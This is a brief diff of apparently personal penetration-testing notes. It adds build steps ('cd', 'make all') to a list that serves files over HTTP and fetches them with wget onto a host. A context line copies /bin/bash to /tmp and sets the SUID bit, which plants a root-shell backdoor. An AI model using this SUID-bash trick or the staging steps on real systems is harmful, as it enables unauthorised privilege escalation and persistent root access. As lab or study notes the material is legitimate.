@@ -32,6 +32,8 @@ if you want to mnove a folder:
 2. python3 -m http.server 80 
 3. wget ......
 4. unzip
+5. cd
+6. make all
 
 
 4. cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
